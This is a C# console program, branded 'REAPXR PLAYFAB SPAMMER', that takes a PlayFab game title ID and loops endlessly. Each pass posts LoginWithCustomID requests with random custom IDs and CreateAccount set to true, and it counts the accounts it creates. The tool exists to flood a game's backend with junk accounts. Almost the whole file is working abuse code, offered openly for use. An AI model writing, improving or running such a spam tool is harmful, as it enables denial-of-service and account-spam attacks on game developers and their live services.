using System;
using System.Diagnostics;
using System.Net;
using System.Net.Http;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Newtonsoft.Json;
Console.Title = "REAPXR PLAYFAB SPAMMER";
Console.ForegroundColor = ConsoleColor.Cyan;
string reaper = @"
               ...                            
             ;::::;                           
           ;::::; :;                          
         ;:::::'   :;                         
        ;:::::;     ;.                        
       ,:::::'  X  X ;           OOO\         
       ::::::;       ;          OOOOO\        
       ;:::::;       ;         OOOOOOOO       
      ,;::::::;     ;'         / OOOOOOO      
    ;:::::::::`. ,,,;.        /  / DOOOOOO    
  .';:::::::::::::::::;,     /  /     DOOOO   
 ,::::::;::::::;;;;::::;,   /  /        DOOO  
;`::::::`'::::::;;;::::: ,#/  /          DOOO 
:`:::::::`;::::::;;::: ;::#  /            DOOO
::`:::::::`;:::::::: ;::::# /              DOO
`:`:::::::`;:::::: ;::::::#/               DOO
 :::`:::::::`;; ;:::::::::##                OO
 ::::`:::::::`;::::::::;:::#                OO
 `:::::`::::::::::::;'`:;::#                O 
  `:::::`::::::::;' /  / `:#                  
   ::::::`:::::;'  /  /   `#              

";
Console.WriteLine(reaper);
Console.ForegroundColor = ConsoleColor.Red;
Console.WriteLine("             REAPXR PLAYFAB SPAMMER");
Console.ForegroundColor = ConsoleColor.Magenta;
Console.WriteLine("              PRESS ENTER TO START");
Console.ReadLine();
Console.Clear();
Console.ForegroundColor = ConsoleColor.White;
Console.Write("TitleID: ");
string text = Console.ReadLine();
int x = 0;
while (true)
{
    Console.Clear();
    if (x % 10 == 0)
    {
        Console.ForegroundColor = ConsoleColor.DarkCyan;
        Console.WriteLine(reaper);
    }
    if (x % 10 == 1)
    {
        Console.ForegroundColor = ConsoleColor.Cyan;
        Console.WriteLine(reaper);
    }
    if (x % 10 == 2)
    {
        Console.ForegroundColor = ConsoleColor.Blue;
        Console.WriteLine(reaper);
    }
    if (x % 10 == 3)
    {
        Console.ForegroundColor = ConsoleColor.DarkBlue;
        Console.WriteLine(reaper);
    }
    if (x % 10 == 4)
    {
        Console.ForegroundColor = ConsoleColor.DarkMagenta;
        Console.WriteLine(reaper);
    }
    if (x % 10 == 5)
    {
        Console.ForegroundColor = ConsoleColor.Magenta;
        Console.WriteLine(reaper);
    }
    if (x % 10 == 6)
    {
        Console.ForegroundColor = ConsoleColor.Red;
        Console.WriteLine(reaper);
    }
    if (x % 10 == 7)
    {
        Console.ForegroundColor = ConsoleColor.DarkRed;
        Console.WriteLine(reaper);
    }
    if (x % 10 == 8)
    {
        Console.ForegroundColor = ConsoleColor.DarkGreen;
        Console.WriteLine(reaper);
    }
    if (x % 10 == 9)
    {
        Console.ForegroundColor = ConsoleColor.DarkYellow;
        Console.WriteLine(reaper);
    }
    if (x % 10 == 10)
    {
        Console.ForegroundColor = ConsoleColor.Yellow;
        Console.WriteLine(reaper);
    }
    Console.WriteLine($"             created {x+1} accounts");
    HttpClient httpClient = new HttpClient();
    httpClient.BaseAddress = new Uri("https://" + text + ".playfabapi.com");
    httpClient.DefaultRequestHeaders.TryAddWithoutValidation("Content-Type", "application/json");
    var value = new
    {
        TitleId = text,
        CustomId = "OCULT" + new Random().Next(11111111, 99999999).ToString(),
        CreateAccount = true
    };
    HttpResponseMessage result = httpClient.SendAsync(new HttpRequestMessage(HttpMethod.Post, "/Client/LoginWithCustomID")
    {
        Content = new StringContent(JsonConvert.SerializeObject(value), Encoding.UTF8, "application/json")
    }).Result;
    httpClient.Dispose();
    x = x + 1;
}